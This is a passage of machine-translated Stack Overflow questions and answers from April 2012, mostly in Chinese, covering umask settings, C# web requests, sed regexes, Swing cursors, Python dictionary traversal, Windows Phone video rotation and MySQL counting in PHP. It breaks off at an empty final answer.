我不知道其他发行版，但如果您使用的是 Debian 或 Ubuntu，请运行

```
sudo sh -c " echo 'umask 027' > /etc/profile.d/umask.sh" 
```

更改`027`为最适合您的值。

现在重新启动您的机器。

瞧！！！你完成了。

更多详情，请查看[在 Ubuntu 中为 umask 发疯！！！！！！](https://forums.informaction.com/viewtopic.php?t=22082). 要点是，因为我们想要保留 useradd 和 userdel 行为——我们可能想要其他帐户的系统默认值——修复是取消注释 umask 行`~/.profile`，然后注销并重新登录。

但是，`~/.profile`是针对特定用户的。对于系统范围的更改，您`/etc/profile.d/`需要`umask 027`在`/etc/profile`.

# c# - 获取 ToString 然后发布？

> ID：10220532
> 
> 赞同：1
> 
> 时间：2012-04-19T01:41:55.220
> 
> 标签：c#, wcf, web-services, rest

我有一个按钮，我正在尝试执行 a `GET`then a `POST`，我想知道是否有人可以帮助我使用下面的代码，我想要做的是将它设置`MessageID`为一个字符串，以便我可以将它用于`POST` `uriAddMessagetoGroup`. ..

```
 XDocument xDoc = XDocument.Load(uri1);
        var MessageID = xDoc.Descendants("Message")
            .Select(n => new
            {
                n.Element("MessageID").Value,
            })
            .ToString();

        string uriAddMessagetoGroup = string.Format("http://localhost:8000/Service/AddMessagetoGroup/{0}/{1}/{2}", textBox4.Text, MessageID, textBox21.Text); 
```

完整代码：

```
 private void button3_Click(object sender, EventArgs e)
        {

            //Get the newly created message while the text is still in the textbox and find its messageID (int)
            string uri1 = "http://localhost:8000/Service/GetMessage/{anything}";
            string tagUri = uri1.Replace("{anything}", textBox21.Text);
            XDocument xDoc = XDocument.Load(tagUri);
            var MessageID = xDoc.Descendants("Message")
                   .Select(n => n.Element("MessageID").Value.ToString());

            //add the string to the uri and add the message to the relevant group while the group still exists in the textbox
            string uriAddMessagetoGroup = string.Format("http://localhost:8000/Service/AddMessagetoGroup/{0}/{1}/{2}", textBox4.Text, MessageID, textBox21.Text);
            byte[] arr2 = Encoding.UTF8.GetBytes(uriAddMessagetoGroup);
            HttpWebRequest req2 = (HttpWebRequest)WebRequest.Create(uriAddMessagetoGroup);
            req2.Method = "POST";
            req2.ContentType = "application/xml";
            req2.ContentLength = arr2.Length;
            Stream reqStrm2 = req2.GetRequestStream();
            reqStrm2.Write(arr2, 0, arr2.Length);
            reqStrm2.Close();
            HttpWebResponse resp2 = (HttpWebResponse)req2.GetResponse();
            MessageBox.Show(resp2.StatusDescription);
            reqStrm2.Close();
            resp2.Close(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T21:03:11.807

答案是使用 FirstOrDefault()

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T01:54:55.893

尝试：

```
 var MessageID = xDoc.Descendants("Message")
        .Select(n =>  n.Element("MessageID").Value.ToString());

 string uriAddMessagetoGroup = string.Format("http://localhost:8000/Service/AddMessagetoGroup/{0}/{1}/{2}", textBox4.Text, MessageID, textBox21.Text); 
```

# asp.net - 将 Visual Basic 应用程序转换为 Web 应用程序？

> ID：10220533
> 
> 赞同：1
> 
> 时间：2012-04-19T01:41:56.250
> 
> 标签：asp.net, web-applications

基本上，我得到了一个用 Visual Basic 编写的程序。我的问题是，我怎么可能将其转换为 Web 应用程序？我已阅读建议将其转换为 asp.net Web 应用程序。但是我该怎么做呢？我才真正开始，我真的需要一些分步说明。太感谢了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T02:14:46.823

The stateless nature of web applications usually requires a totally different design than stateful desktop apps. (There is generally no state stored between clicks on the webserver, so every click(postback) is a brand new beginning from the server's point of view.)

Start by breaking down the app into the progression of screens present in the original app. Basically, everytime your desktop app has enough information to compute a new big chunk of the final output, that's a place where you might send the input data to the server for processing in your web version. In between each step, there's a new screen (or page) for the collection of new input and the display of what can be computed from the previously collected data.

On the server side, your old computation/database algorithms might be reusable if they don't contain much code for updating the Desktop app's UI.

There are a variety of ways for modeling your screens/pages. In .NET you've at least got ASP.NET, ASP.NET MVC, and even Silverlight.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T02:26:02.627

没有“转换”过程。您将需要从头开始，并且不能合理地期望重用任何旧代码。这两个世界太不一样了。

首先记录现有应用程序的主要要求，然后使用它来设计和开发新网站。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-10-28T17:25:45.517

**脚步**

*   如果未知，请选择您的新环境。
*   如果您还不知道，请好好学习新环境
*   将代码转换为所需的框架

**代码转换**

VB 代码很可能是程序性的，没有类。将其复制并粘贴到您的新环境中。你可以做“全部”或一块一块地做。这可能取决于细节，但我建议所有这些，以便您可以立即进行批量变量重命名和函数语法清理。比如VB转PHP，就得`$`在每个变量前面加上。您还必须更改函数头以符合新环境。

如果您逐段移植代码，则必须为每段代码一遍又一遍地做同样的事情。如果您对整个代码库执行一次，优化代码最初可能需要更多时间，但您将执行一次批量操作而不是多次。

**编写测试**

如果你正在经历代码转换的麻烦，你不妨做对。测试将

*   确保您已正确转换功能

专注于封装功能核心，应用程序的引擎

# regex - 如何修改这个 sed 正则表达式来替换扩展名只有一个“。”

> ID：10220535
> 
> 赞同：1
> 
> 时间：2012-04-19T01:42:05.627
> 
> 标签：regex, unix, replace, sed

我试图得到：

```
echo "penguin." | sed 's/\.[A-Za-z0-9][A-Za-z0-9]*$/'".pippa"'/g' 
```

输出：

```
penguin.pippa 
```

如何修改代码以便它可以解释“。” 适当地？

谢谢你

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T01:47:15.727

```
echo "penguin."| sed 's/\.$/.pippa/g' 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-19T01:47:21.533

你的表情：

```
sed 's/\.[A-Za-z0-9][A-Za-z0-9]*$/'".pippa"'/g' 
```

你是说在点之后必须有一个字母字符。`[A-Za-z0-9][A-Za-z0-9]*`这表示“一个或多个” `[A-Za-z0-9]`。点后没有字母数字，字符串结束。所以 sed 永远不会应用更改。删除它，你就准备好了：

```
echo "penguin." | sed 's/.[A-Za-z0-9]*$/.pippa/g' 
```

此外，sed 表达式第二部分中的引号在这里没有任何作用。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-19T01:46:52.383

`sed 's/\.[A-Za-z0-9]*$/'".pippa"'/g'`

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-19T01:49:50.580

```
echo "penguin." | sed 's/\./'".pippa"'/g' 
```

或者

```
echo "penguin." | sed 's/\.[A-Za-z0-9]*$/'".pippa"'/g' 
```

# java - 当鼠标在 2 个面板的交叉区域上时更改光标

> ID：10220540
> 
> 赞同：0
> 
> 时间：2012-04-19T01:43:37.467
> 
> 标签：java, swing, panel

我在 JFrame 上有 2 个 Jpanel（左面板和右面板）。当鼠标在 2 个面板的交叉区域上时如何更改光标？

![在此处输入图像描述](../Images/b36eca9050e1a4a281a327a95d95e1d4.png)

到目前为止，我尝试过：

```
 ...
 public void mouseMoved(MouseEvent e) {
           if (leftpanel.contains(e.getPoint()) && rightpanel.contains(e.getPoint())){

                frame.setCursor(Cursor.getPredefinedCursor(Cursor.W_RESIZE_CURSOR));

          }
           else{ frame.setCursor(Cursor.getPredefinedCursor(Cursor.DEFAULT_CURSOR));
        }; 
```

但它不工作..

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-19T02:07:58.640

Your question was how to detect the intersection of two panels and change the cursor. Here is an example of how to do that

```
 public static void overlapTest() {
        final JPanel p1 = new JPanel();
        final JPanel p2 = new JPanel();
        p1.setBackground(Color.RED);
        p2.setBackground(Color.BLUE);
        final JPanel container = new JPanel();
        container.setLayout(null);
        container.add(p1);
        container.add(p2);
        p1.setBounds(0,0,120,100);
        p2.setBounds(80,0,120,100);
        Dimension size = new Dimension(200,100);
        container.setPreferredSize(size);
        container.addMouseMotionListener(new MouseMotionListener() {

            @Override
            public void mouseDragged(MouseEvent arg0) {
            }

            @Override
            public void mouseMoved(MouseEvent e) {
                Point pt1 = e.getPoint();
                pt1.translate(-p1.getX(), -p1.getY());
                Point pt2 = e.getPoint(); 
                pt2.translate(-p2.getX(), -p2.getY());
                if (p1.contains(pt1) && p2.contains(pt2)) {
                        System.out.println("both contain: " + e.getPoint());
                        container.setCursor(Cursor.getPredefinedCursor(Cursor.W_RESIZE_CURSOR));
                  }
                  else{ 
                      container.setCursor(Cursor.getPredefinedCursor(Cursor.DEFAULT_CURSOR));
                  };
            }

        });
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T02:21:12.330

按照 Jeffey 的建议，我应该使用 JSlitPane 来处理。

# objective-c - UISlider 防止触摸主视图中的子视图

> ID：10220548
> 
> 赞同：0
> 
> 时间：2012-04-19T01:46:05.093
> 
> 标签：objective-c, ios, xcode, uislider

我们在视图中有一个 UISlider。然后我们可以在 UISlider 上方呈现另一个视图。不幸的是，我们遇到了一个问题，滑块前面的任何东西都不再响应触摸。我们可以做些什么来将滑块送回吗？我们已经在做以下事情来把我们的观点放在前面

```
[self.view bringSubviewToFront:newView]; 
```

这似乎对我们的问题没有帮助。

非常感谢您！

# android - android在相机上显示矩形

> ID：10220549
> 
> 赞同：3
> 
> 时间：2012-04-19T01:46:14.010
> 
> 标签：android, android-camera, android-camera-intent

嗨，我想在相机中显示一个矩形，这样当用户拍摄时，只能处理矩形内的区域。知道我该怎么做吗？并且可以通过沿角拖动来调整矩形大小。

我没有调用相机应用程序。我正在使用相机 API。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-25T18:59:32.020

嗨，我使用本教程解决了问题，[请参阅此处](http://adblogcat.com/a-camera-preview-with-a-bounding-box-like-google-goggles/) 如果有一天链接丢失，我在[此处保留了 pdf](https://www.dropbox.com/s/sx97jgmd32dezhy/adblogcat.com-A%20camera%20preview%20with%20a%20bounding%20box%20like%20Google%20goggles.pdf?dl=0)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-25T06:37:36.517

你可以看到我的开源应用程序[http://code.google.com/p/android-palmprint-api](http://code.google.com/p/android-palmprint-api)，在 SVN 中你可以看到源代码。![在实时相机图像上绘制 AR 信息](../Images/d198fccf5ee2f7460cc3db1f3a0e576f.png)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-19T02:14:34.497

I think you need to draw a rectangle that has size as you desire. Then you just need to set that size for preview frame, and when you get the result return from onPreviewFrame , you will process on that data. You can refer the ViewfinderView class of Xzing source [here](http://code.google.com/p/zxing/source/browse/trunk/android/src/com/google/zxing/client/android/ViewfinderView.java) to learn how to draw a rectangle in camera preview. and refer CameraConfigurationManager,PreviewCallback,CameraManager also in xzing source to learn how to set preview size and process result data return from camera driver. Hope this help you.

# dictionary - 走自引用字典的 Pythonic 方式

> ID：10220550
> 
> 赞同：3
> 
> 时间：2012-04-19T01:46:35.133
> 
> 标签：dictionary, python-3.x, python

我有一个字典，其中条目值可以通过键引用另一个条目，最终以没有当前值的条目或遇到“-”结尾。这个数据结构的目标是找到每个条目的父项，并将“-”转换为无。例如采取：

```
d = {'1': '-', '0': '6', '3': '1', '2': '3', '4': '5', '6': '9'} 
```

*   '1' 是映射到 '-' 的根，因此它应该导致*None*。
*   '0' 的父级是 '6'，它的父级是 '9'，所以它应该是 '9'。
*   '3' 有一个 '1' 的父级，它映射到 '-' 所以它应该导致*None*。
*   '2' 有一个 '3' 的父级，它有一个 '1' 的父级映射到 '-' 所以它应该导致*None*。
*   '4' 应保留在 '5' 的父级
*   '6' 应保留在 '9' 的父级

我的详细解决方案如下：

```
d = {'1': '-', '0': '6', '3': '1', '2': '3', '4': '5', '6': '9'}
print(d)
for dis, rep in d.items():
    if rep == "-":
        d[dis] = None
        continue

    while rep in d:
        rep = d[rep]
        if rep == "-":
            d[dis] = None
            break
    else:
        d[dis] = rep
print(d) 
```

输出是：

```
{'1': '-', '0': '6', '3': '1', '2': '3', '4': '5', '6': '9'}
{'1': None, '0': '9', '3': None, '2': None, '4': '5', '6': '9'} 
```

结果是正确的。“1”元素没有父元素，“2”/“3”元素指向“1”。他们也应该没有父母。

是否有使用 Python 3+ 的更简洁的 Python 方式来完成此任务？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-19T02:55:26.753

要“遍历”字典，只需在循环中进行查找，直到不再有：

```
>>> def walk(d, val):
        while val in d:
            val = d[val]
        return None if val == '-' else val

>>> d = {'1': '-', '0': '6', '3': '1', '2': '3', '4': '5', '6': '9'}
>>> print {k: walk(d, k) for k in d}
{'1': None, '0': '9', '3': None, '2': None, '4': '5', '6': '9'} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T17:56:43.927

到目前为止，我想发布一些关于这三种方法的分析统计数据：

```
Running original procedural solution.
5 function calls in 0.221 seconds

Ordered by: standard name

ncalls  tottime  percall  cumtime  percall filename:lineno(function)
    1    0.000    0.000    0.221    0.221 <string>:1(<module>)
    1    0.221    0.221    0.221    0.221 test.py:12(verbose)
    1    0.000    0.000    0.221    0.221 {built-in method exec}
    1    0.000    0.000    0.000    0.000 {method 'disable' of '_lsprof.Profiler' objects}
    1    0.000    0.000    0.000    0.000 {method 'items' of 'dict' objects}

885213
Running recursive solution.
     994022 function calls in 1.252 seconds

Ordered by: standard name

ncalls  tottime  percall  cumtime  percall filename:lineno(function)
    1    0.000    0.000    1.252    1.252 <string>:1(<module>)
994018    0.632    0.000    0.632    0.000 test.py:27(recursive)
    1    0.620    0.620    1.252    1.252 test.py:35(do_recursive)
    1    0.000    0.000    1.252    1.252 {built-in method exec}
    1    0.000    0.000    0.000    0.000 {method 'disable' of '_lsprof.Profiler' objects}

885213
Running dict comprehension solution.
     994023 function calls in 1.665 seconds

Ordered by: standard name

ncalls  tottime  percall  cumtime  percall filename:lineno(function)
    1    0.059    0.059    1.665    1.665 <string>:1(<module>)
994018    0.683    0.000    0.683    0.000 test.py:40(walk)
    1    0.000    0.000    1.606    1.606 test.py:45(dict_comprehension)
    1    0.923    0.923    1.606    1.606 test.py:46(<dictcomp>)
    1    0.000    0.000    1.665    1.665 {built-in method exec}
    1    0.000    0.000    0.000    0.000 {method 'disable' of '_lsprof.Profiler' objects}

885213 
```

下面是运行这三种方法的代码：

```
import cProfile
import csv
import gzip

def gzip_to_text(gzip_file, encoding="ascii"):
    with gzip.open(gzip_file) as gzf:
        for line in gzf:
            yield str(line, encoding)

def verbose(d):
    for dis, rep in d.items():
        if rep == "-":
            d[dis] = None
            continue

        while rep in d:
            rep = d[rep]
            if rep == "-":
                d[dis] = None
                break
        else:
            d[dis] = rep
    return d

def recursive(d, k):
    v = d[k]
    if v == '-':
        v = d[k] = None
    elif v in d:
        v = d[k] = recursive(d, v)
    return v

def do_recursive(d):
    for k in d:
        recursive(d, k)
    return d

def walk(d, val):
    while val in d:
        val = d[val]
    return None if val == '-' else val

def dict_comprehension(d):
    return {k : walk(d, k) for k in d}

# public dataset pulled from url: ftp://ftp.ncbi.nih.gov/gene/DATA/gene_history.gz
csvr = csv.reader(gzip_to_text("gene_history.gz"), delimiter="\t", quotechar="\"")
d = {rec[2].strip() : rec[1].strip() for rec in csvr if csvr.line_num > 1}
print("Running original procedural solution.")
cProfile.run('d = verbose(d)')
c = 0
for k, v in d.items():
    c += (1 if v is None else 0)
print(c)
print("Running recursive solution.")
cProfile.run('d = do_recursive(d)')
c = 0
for k, v in d.items():
    c += (1 if v is None else 0)
print(c)
print("Running dict comprehension solution.")
cProfile.run('d = dict_comprehension(d)')
c = 0
for k, v in d.items():
    c += (1 if v is None else 0)
print(c) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-19T02:28:31.843

您可以像这样定义一个函数

```
def recursive_get(d, k):
    v = d[k]
    if v == '-':
        v = d[k] = None
    elif v in d:
        v = d[k] = recursive_get(d, v)
    return v 
```

当您用于`recursive_get`访问键时，它将在遍历时修改值。这意味着您不会浪费时间收拾不需要的分支

```
>>> d = {'1': '-', '3': '1', '2': '3'}
>>> recursive_get(d, '3')
>>> d
{'1': None, '3': None, '2': '3'}         # didn't need to visit '2'

>>> d = {'1': '-', '3': '1', '2': '3'}
>>> recursive_get(d, '2')
>>> d
{'1': None, '3': None, '2': None} 
```

如果您只想强制`d`进入它的最终状态，只需遍历所有键

```
for k in d:
    recursive_get(d, k) 
```

# reference - 使用 Nant 构建项目并运行 NUnit

> ID：10220552
> 
> 赞同：0
> 
> 时间：2012-04-19T01:46:54.553
> 
> 标签：reference, nunit, nant, csproj

我想用Nant建一个项目并导入dll文件来执行NUnit。

但我不知道如何编写 xml 代码来构建 csproj 文件。

这是我的 xml：

* * *

```
<?xml version="1.0"?>
<project name="Aaron.Guo.Second.Project" default="build" basedir=".">
  <property name="basename" value="A"/>
  <property name="debug" value="true"/>
  <target name="build">
    <csc target="library" debug="false" warnaserror="true" output="D:/A/bin/A1.dll">
      <sources basedir="D:/A">
        <include name="**/*.cs" />
      </sources>
      <references>
        <include name="D:/A/bin/*.dll"/>
      </references>
    </csc>
  </target>
</project> 
```

* * *

我只知道“包含名称”可以构建cs文件

但它也显示无法引用 .us 的重复使用

我将参考文件放在 D:/A/bin/ 方向。

我该如何编写xml？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T05:02:14.297

您应该使用`<exec>` [http://nant.sourceforge.net/release/0.91/help/tasks/exec.html](http://nant.sourceforge.net/release/0.91/help/tasks/exec.html)或`<msbuild>` [http://nantcontrib.sourceforge.net/release/0.85-rc4/help/tasks/msbuild.html](http://nantcontrib.sourceforge.net/release/0.85-rc4/help/tasks/msbuild.html)

# gwt - Gwt 2.1 和 Smartgwt 3.0

> ID：10220556
> 
> 赞同：1
> 
> 时间：2012-04-19T01:47:20.730
> 
> 标签：gwt, smartgwt

您好，我想知道是否可以使用 GWT 2.1 版本和 smartgwt 3.0，因为我想实现一个仅适用于 smartgwt 3.0 的网格，并且我的工作网站有 GWT 2.1，非常感谢。问候。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T12:22:02.013

SmartGWT 是一个“替代”GWT 的完整框架。我的意思是，在 gwt 应用程序中使用 smartgwt 的单个小部件时会遇到问题。

如果你想使用 SmartGWT，你应该使用它作为你的框架。在此处查看更多信息：[SmartGWT 与 GWT？](https://stackoverflow.com/questions/1915374/smartgwt-with-gwt)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T09:50:28.527

我正在使用 GWT 2.4 并在 gwtext 中有一些组件，但现在我用 SmartGwt 替换了这些 gwtext 组件并且它工作正常。

您可以使用 smartgwt 的某些组件和 GWT 的某些组件或任何其他库

只需确保返回类型.. 最好。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-19T12:17:08.187

是的，这就是我正在使用的。即使不推荐，您甚至可以使用旧版本的 GWT。完全不推荐使用 smartGWT 组件和 GWT。仅使用 GWT 或仅使用 smartGWT

# c# - 画笔方向与手机方向不匹配

> ID：10220558
> 
> 赞同：5
> 
> 时间：2012-04-19T01:47:23.027
> 
> 标签：c#, windows-phone-7, xaml

我正在尝试将视频画笔方向与手机的方向相匹配，但我在实施此解决方案时遇到了问题。我的 xaml 页面设置为 PortraitOrLandscape，无论手机的方向如何，我都希望视频画笔正面朝上。在 onOrentationChanged 事件中添加方向改变 if 语句之前，出现以下情况

电话：横向左侧，视频画笔：右侧向上

电话：人像，视频画笔，顺时针旋转 -90

电话：横向右侧，视频画笔，顺时针旋转 -180

XAML

```
<Rectangle x:Name="videoRectangle" Margin="0,0,0,0">
            <Rectangle.Fill>
                <VideoBrush x:Name="viewfinderBrush" AlignmentX="Left" AlignmentY="Top" Stretch="UniformToFill">
                    <VideoBrush.RelativeTransform>
                        <CompositeTransform x:Name="viewfinderTransform" 
                                            CenterX="0.5" CenterY="0.5"/>
                    </VideoBrush.RelativeTransform>
                </VideoBrush>                    
            </Rectangle.Fill>
        </Rectangle> 
```

XAML.CS

```
protected override void OnOrientationChanged(OrientationChangedEventArgs e)
    {
        base.OnOrientationChanged(e);

        if (e.Orientation == PageOrientation.LandscapeLeft)
        {                //do nothing
                         //The videobrush orientation is currently right side up
        }
        if (e.Orientation == PageOrientation.Portrait)
        {
            //the videobrush is currently rotated 90 degrees counter clockwise
            this.viewfinderTransform.Rotation = this.camera.Orientation + 90.0;
        }
        if (e.Orientation == PageOrientation.LandscapeRight)
        {
            //the videobrush is currently rotated 180 degrees counter clockwise
            this.viewfinderTransform.Rotation = this.camera.Orientation + 180;
        }
    } 
```

添加 if 语句后，画笔方向变得更加疯狂。我究竟做错了什么？无论手机的方向如何，我只想让视频画笔正面朝上。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-12T10:25:22.697

我正在使用一个简单的开关/外壳来正确旋转视频画笔：

```
protected override void OnOrientationChanged(OrientationChangedEventArgs e)
{
  base.OnOrientationChanged(e);
  switch (e.Orientation)
  {
    case PageOrientation.Landscape:
    case PageOrientation.LandscapeLeft:
      videoBrushTransform.Rotation = 0;
      break;
    case PageOrientation.LandscapeRight:
      videoBrushTransform.Rotation = 180;
      break;
    case PageOrientation.Portrait:
    case PageOrientation.PortraitUp:
      videoBrushTransform.Rotation = 90;
      break;
    case PageOrientation.PortraitDown:
      videoBrushTransform.Rotation = 270;
      break;
  }
} 
```

很适合我。

# ios - 升级到 xcode 4.3.2 后，iOS 模拟器不再连接到联网的 midi

> ID：10220559
> 
> 赞同：1
> 
> 时间：2012-04-19T01:47:43.430
> 
> 标签：ios, xcode, ipad, midi, simulator

我使用 PGMIDI (https://github.com/petegoodliffe/PGMidi) 构建了一个应用程序。一旦我使用 iOS 5.1 SDK 将 xcode 更新到 4.3.2，模拟器就不再找到联网的 midi 连接（请参阅[http://syntheticbits.com/blog/?p=878](http://syntheticbits.com/blog/?p=878)）。我用 PGMIDI 沙盒应用程序尝试过这个，它也不再有效。但是，当应用程序部署在设备上时，联网的 midi 连接仍然有效。

然后我也在我的笔记本电脑上升级到 4.3.2，同样的事情发生了。我已经与另一位从事类似项目的开发人员进行了交谈，他在升级时是否坏了，但他没有任何问题。我尝试重新安装 xcode 并尝试使用 ios 5.0 模拟器，但没有运气。我还尝试重置我的调制解调器和路由器。

在我学校的网络上，我注意到我的设备（iPhone 4GS）特别被阻止连接到联网的 midi，但其他设备被拾取并且模拟器工作。我想知道这是否是特定于网络的。有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T13:42:47.083

尝试在项目设置中更改基本 sdk，然后重新构建您的应用程序。

# open-source - ctrl+f 在 chromium 的源代码中在哪里处理？

> ID：10220560
> 
> 赞同：5
> 
> 时间：2012-04-19T01:47:44.940
> 
> 标签：open-source, chromium

我试图了解`ctrl`+`f`功能在铬中的工作原理。本来想直接看源码的，但是代码比较大而且复杂。有谁知道关于`ctrl`+`f`功能的代码在哪里？

**相关问题**：[获取查找文本（Ctrl+F）不同的突出显示文本结果](https://stackoverflow.com/questions/9868272/getting-find-text-ctrlf-different-highlighted-text-result)

# visual-studio-2010 - 在 Visual Studio 负载测试中手动分配浏览器进行测试

> ID：10220563
> 
> 赞同：0
> 
> 时间：2012-04-19T01:48:42.837
> 
> 标签：visual-studio-2010, testing, load, load-testing, performance-testing

Visual Studio 2010 能够使用不同的浏览器配置文件运行测试脚本。对于具有两个脚本（script1 和 script2）的特定场景，您可以将 Browser Mix 配置为将 50% 的脚本作为 IE7 用户运行，将 50% 的脚本作为移动用户运行。

我面临的问题是网站的移动版和桌面版完全不同。因此，为桌面录制的相同脚本不会在移动设备上运行。我看不到任何配置或强制 script1 仅作为 IE7 运行和 script2 仅作为 iphone 的 safari 运行的配置或方法。

这对于许多其他性能工具来说是可能的，但我担心考虑到 MSVS 负载测试的简单性，这可能是不可能的。有谁知道这是否可能，我认为可能的唯一方法是，如果在每个脚本中我可以以某种方式覆盖浏览器混合设置？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T10:17:07.170

所以我找到了答案。我试图在同一场景中添加仅桌面浏览器测试和仅移动测试。这里的关键是在现有的“负载测试”中创建一个单独的场景，其中一个仅用于桌面浏览器测试，一个仅用于移动测试，如下图所示，其中“Web 测试”场景将在 IE7 之间拆分和 Firefox3，而“移动”场景将只在智能手机上运行。

![设想](../Images/d89f026feffa924047b1671f233107cd.png)

# php - MySQL计算复杂查询结果？

> ID：10220564
> 
> 赞同：2
> 
> 时间：2012-04-19T01:48:46.307
> 
> 标签：php, mysql, count

我有以下查询：

```
$count = (SELECT COUNT(*) FROM post GROUP BY ID
HAVING ID NOT IN (SELECT taxiID FROM taxi WHERE userID = '.$userID.' AND value IS NOT NULL)
ORDER BY postID), OBJECT); 
```

计数包含：

```
count = Array ( [0] => stdClass Object ( [COUNT(*)] => 1 ) [1] => stdClass Object ( [COUNT(*)] => 1 ) [2] => stdClass Object ( [COUNT(*)] => 1 ) [3] => stdClass Object ( [COUNT(*)] => 1 ) [4] => stdClass Object ( [COUNT(*)] => 1 ) [5] => stdClass Object ( [COUNT(*)] => 1 ) [6] => stdClass Object ( [COUNT(*)] => 1 ) [7] => stdClass Object ( [COUNT(*)] => 1 ) [8] => stdClass Object ( [COUNT(*)] => 1 ) [9] => stdClass Object ( [COUNT(*)] => 1 ) [10] => stdClass Object ( [COUNT(*)] => 1 ) [11] => stdClass Object ( [COUNT(*)] => 1 ) [12] => stdClass Object ( [COUNT(*)] => 1 ) [13] => stdClass Object ( [COUNT(*)] => 1 ) [14] => stdClass Object ( [COUNT(*)] => 1 ) [15] => stdClass Object ( [COUNT(*)] => 1 ) [16] => stdClass Object ( [COUNT(*)] => 1 ) [17] => stdClass Object ( [COUNT(*)] => 1 ) [18] => stdClass Object ( [COUNT(*)] => 1 ) [19] => stdClass Object ( [COUNT(*)] => 1 ) 
```

我需要计算上述提供的结果数量。问题是，我不知道如何使用结果！

我有这个代码，但现在它不起作用：

```
<?php if($count[0]->{'COUNT(*)'} > 10){ ?
    echo "Load More";
}else { 
    echo "Nothing to load";
} ?> 
```

$count 应该超过 10 并且我的 php 应该回显 Load More 但它回显 Nothing to load。

出租车表如下所示：

```
ID    taxiID    userID    value
1     1         1         1
2     1         6         1
3     1         4         0
4     2         1         0
5     2         6         1
6     2         4         0
7     3         6         1
8     3         4         0 
```

帖子表如下所示：

```
ID    postID    randomNum
1     1         564
2     2         789
3     3         234
4     4         845
5     5         089 
```

假设 $userID 为 1，则查询返回 postID 1,3,4,5（1 是喜欢的，3 是用户 1 不喜欢和不喜欢的，4 和 5 不是任何用户喜欢和不喜欢的）。因此 $count 应该包含 4（找到 4 个结果）。

如果我的查询效率低下，我该如何调整它以提高效率？

最终，问题是我该怎么做：

```
if ($count > 10) {} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-19T03:55:52.373

您的问题是，您的查询没有返回您认为它返回的内容（它总是有助于独立运行查询，以查看结果集是否符合您的预期）。

好吧，让我们分解一下。

> 它正在计算用户不喜欢或不喜欢的所有帖子。喜欢和不喜欢存储在出租车表中。Taxi.taxiID 匹配 post.ID。因此，如果找到任何非 null 值的用户 ID，请忽略该 post.ID。我正在计算那些没有被忽略的 post.ID

您正在尝试为该用户 ID 计算出租车表中**没有**匹配记录的所有帖子。您在这里想要`JOIN`的是表并获取`post`通常会被连接排除的那些行。这是通过左外连接实现的

（**已编辑**）

```
SELECT p.ID, t.taxiID
FROM post p LEFT OUTER JOIN taxi t ON p.ID = t.taxiID AND t.userID = '.$user.'
HAVING t.taxiID IS NULL 
```

该`HAVING`子句是说：只有结果集中那些没有相应 t.taxiID 的行。

如果您运行此查询并获得预期的行集（该用户没有喜欢或不喜欢的帖子），那么您可以添加一个外部查询来计算返回的行数：

```
SELECT COUNT(*) as count FROM (
    SELECT p.ID, t.taxiID
    FROM post p LEFT OUTER JOIN taxi t ON p.ID = t.taxiID AND t.userID = '.$user.'
    HAVING t.taxiID IS NULL
) a 
```

这应该返回一个名为 count 的标量。在这种情况下，您可以说：

```
if ($count[0]->count > 10) { blah blah blah } 
```

（**第二次编辑**）这个内部查询将为您提供出租车表中值 = 1 或根本没有值的帖子，这将导致您的示例返回 4：

```
SELECT p.ID, t.taxiID, t.value
FROM post p LEFT OUTER JOIN taxi t ON p.ID = t.taxiID AND t.userID = '.$user.'
HAVING t.taxiID IS NULL OR t.value = 1 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T01:53:05.307

根据 MySQL 文档，如果您想知道没有 LIMIT 子句会返回多少结果：

> 一个 SELECT 语句可能包含一个 LIMIT 子句来限制服务器返回给客户端的行数。在某些情况下，希望知道在没有 LIMIT 的情况下该语句将返回多少行，但无需再次运行该语句。要获取此行数，请在 SELECT 语句中包含 SQL_CALC_FOUND_ROWS 选项，然后调用 FOUND_ROWS()：

```
mysql> SELECT SQL_CALC_FOUND_ROWS * FROM tbl_name
    -> WHERE id > 100 LIMIT 10;
mysql> SELECT FOUND_ROWS(); 
```

[http://dev.mysql.com/doc/refman/5.0/en/information-functions.html#function_found-rows](http://dev.mysql.com/doc/refman/5.0/en/information-functions.html#function_found-rows)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-19T03:39:52.057

我找到了答案，这很简单：

```
if (count($count) > 10) {} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-19T01:51:27.737

```
SELECT COUNT(*) FROM post
WHERE postID NOT IN                     
  ( SELECT taxiID
    FROM taxi 
    WHERE userID = '.$userID.'
      AND value = 0
  ) 
ORDER BY postID; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-19T01:52:53.737

```
SELECT COUNT(*) FROM post
WHERE postID NOT IN                     
  ( SELECT taxiID
    FROM taxi 
    WHERE userID = '.$userID.'
      AND value = 0
  ) 
```

如果这不起作用，您能否向我们提供错误消息？

* * *

## 回答 #6

> 赞同：0
> 
